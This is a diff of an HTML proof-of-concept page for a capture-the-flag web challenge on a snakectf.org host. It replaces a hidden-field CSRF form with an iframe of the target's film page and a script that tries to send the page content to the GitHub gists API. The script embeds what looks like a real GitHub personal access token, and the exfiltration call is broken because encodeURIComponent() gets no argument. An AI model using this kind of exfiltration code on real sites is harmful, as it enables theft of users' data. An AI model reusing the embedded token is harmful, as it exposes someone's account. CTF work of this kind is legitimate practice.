@@ -1,11 +1,19 @@
 <!DOCTYPE html>
 <html lang="en">
 	<body>
-		<h1>Form CSRF PoC</h1>
-		<form method="POST" action="https://634b195243f24ccdbc62e09f47f0eec9.film-library.challs.snakectf.org/add">
-			<input type="hidden" name="title" value="ihatedemo">
-			<input type="hidden" name="description" value="ocracy">
-			<input type="submit" value="Submit Request">
-		</form>
+	<iframe id="meow" src='https://634b195243f24ccdbc62e09f47f0eec9.film-library.challs.snakectf.org/film?id=0'></iframe>
 	</body>
+	<script>
+	x = document.getElementById("meow").innerHTML;
+	fetch('https://api.github.com/gists',
+	      {
+		      method: 'post',
+		      headers: {
+			      'Accept': 'application/vnd.github+json',
+			      'Authorization': 'Bearer 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',
+			      'X-GitHub-Api-Version': '2022-11-28'
+		      },
+		body:JSON.stringify({"description":"Example of a gist","public":false,"files":{"godo.html":{"content":encodeURIComponent()}}})
+	})
+	</script>
 </html>
